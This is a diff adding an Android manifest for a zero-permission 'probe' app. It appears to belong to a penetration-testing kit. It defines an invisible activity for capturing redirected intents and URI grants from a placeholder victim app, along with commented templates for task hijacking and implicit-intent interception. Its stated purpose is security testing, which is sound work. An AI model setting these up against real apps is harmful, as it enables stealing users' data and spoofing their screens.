@@ -1,0 +1,71 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android">
+
+    <!--
+      ════════════════════════════════════════════════════════════════════════
+      THIS BLOCK IS THE ARGUMENT. IT IS EMPTY ON PURPOSE. DO NOT ADD TO IT.
+
+      The entire point of this app is that it declares NO permissions. That is
+      what establishes attacker model AM-03 and it is the single most
+      rating-relevant fact in any finding proved with this app. Screenshot this
+      file for the evidence tree.
+
+      If a test genuinely needs a permission, you have dropped to AM-04 and the
+      finding must say so.
+      ════════════════════════════════════════════════════════════════════════
+    -->
+
+    <queries>
+        <!-- API 30+ package visibility. Narrow this to the victim only. -->
+        <package android:name="com.victim.app" />
+    </queries>
+
+    <application
+        android:label="probe"
+        android:allowBackup="false"
+        android:supportsRtl="true">
+
+        <activity
+            android:name=".MainActivity"
+            android:exported="true"
+            android:label="probe">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <!-- Receives redirected Intents and URI grants from the victim. -->
+        <activity
+            android:name=".LootActivity"
+            android:exported="true"
+            android:excludeFromRecents="true"
+            android:taskAffinity=""
+            android:theme="@android:style/Theme.NoDisplay" />
+
+        <!--
+          TASK HIJACK (D04). Uncomment and set the victim's package as taskAffinity,
+          then confirm with:  adb shell dumpsys activity activities | grep -A3 'Task{'
+        -->
+        <!--
+        <activity
+            android:name=".HijackActivity"
+            android:exported="true"
+            android:taskAffinity="com.victim.app"
+            android:allowTaskReparenting="true"
+            android:launchMode="singleTask" />
+        -->
+
+        <!--
+          IMPLICIT-INTENT INTERCEPTION (D05). Uncomment and set the action the victim
+          sends implicitly, to win the resolver or the chooser.
+        -->
+        <!--
+        <receiver android:name=".Sniffer" android:exported="true">
+            <intent-filter android:priority="999">
+                <action android:name="com.victim.app.SOME_IMPLICIT_ACTION" />
+            </intent-filter>
+        </receiver>
+        -->
+    </application>
+</manifest>
